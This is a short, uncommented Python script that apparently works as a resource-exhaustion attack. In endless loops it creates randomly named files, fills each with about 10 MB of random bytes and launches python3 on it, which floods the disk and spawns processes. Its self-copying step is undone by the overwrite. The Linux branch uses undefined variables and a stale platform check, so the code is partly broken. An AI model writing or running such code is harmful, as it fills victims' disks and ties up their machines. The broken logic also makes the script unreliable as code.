import sys, os, random, string, subprocess

SCRIPT = sys.argv
NAME = str(SCRIPT[0])

def RANDOM(Length):
	Letters_ = string.ascii_lowercase
	return ''.join(random.choice(Letters_) for i in range(Length))

def WIN32():
	TEMP_FILE = open(__file__).read()
	TEMP_A = RANDOM(64)
	TEMP_B = RANDOM(4)

	with open(TEMP_A + '.' + TEMP_B, 'w') as TEMP_C:
		TEMP_C.write(TEMP_FILE)
	with open(TEMP_A + '.' + TEMP_B, 'wb') as TEMP_D:
		TEMP_D.write(os.urandom(10240000))

	TEMP_E = '{}.{}'.format(TEMP_A, TEMP_B)
	subprocess.Popen(["python3", TEMP_E], shell = False)

def LINUX():
	TEMP_FILE = open(__file__).read()
	TEMP_A = RANDOM(64)
	TEMP_B = RANDOM(4)

	with open(TEMP_A + '.' + TEMP_B,'w') as TEMP_C:
		TEMP_C.write(File_)
	with open(ExampleName,'wb') as TEMP_D:
		TEMP_D.write(os.urandom(10240000))

	TEMP_E = '{}.{}'.format(TEMP_A, TEMP_B)
	subprocess.Popen(["python3", TEMP_E], shell = False)

if sys.platform == "win32":
	while True:
		WIN32()

elif sys.platform == "linux2":
	while True:
		LINUX()
